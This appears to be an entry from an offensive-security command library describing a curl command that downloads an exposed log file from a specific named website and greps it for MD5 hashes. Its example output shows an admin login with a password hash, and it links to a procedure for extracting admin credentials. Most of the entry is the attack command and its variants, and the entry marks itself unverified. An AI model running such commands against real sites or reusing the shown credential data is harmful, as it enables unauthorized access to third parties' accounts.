---
id: cmd-curl-log-fetch
data: 'curl https://www.devicelock.com/log.txt -o extracted_log.txt'
tags:
  - recon
  - information-disclosure
type: command
output: >-
  Raw log file content saved to extracted_log.txt, e.g., '2020-03-20 08:12:15 -
  main - <br>Module: change password
  (4.1.2)<br>change_password=yes;/forum/forum_auth.php;login=admin;md5=2bca2f877b7a727861b59f4a4039d2e9'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.430Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-log

## Command

```bash
curl https://www.devicelock.com/log.txt -o extracted_log.txt
```

## Description

This command uses curl to perform a simple HTTP GET request to fetch a publicly accessible log file, downloading its contents locally for inspection. It is useful in information disclosure scenarios where sensitive data like credentials are exposed without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://www.devicelock.com/log.txt` | The target URL of the exposed log file | Yes |
| `-o extracted_log.txt` | Output file to save the response | Yes |

## Examples

### Basic Usage

```bash
curl https://www.devicelock.com/log.txt -o extracted_log.txt
```

### Advanced Usage

```bash
curl -s https://www.devicelock.com/log.txt -o extracted_log.txt && cat extracted_log.txt | grep md5
```

> The `-s` flag silences progress output, and piping to grep filters for MD5 hashes.

## Expected Output

Successful execution downloads the log file, which may contain timestamped entries with sensitive data like 'login=admin;md5=2bca2f877b7a727861b59f4a4039d2e9'. If the file is protected, expect HTTP error codes (e.g., 403 Forbidden).

## Related

- [[Related Procedure|Extract-Admin-Credentials-from-Exposed-Log-File]]
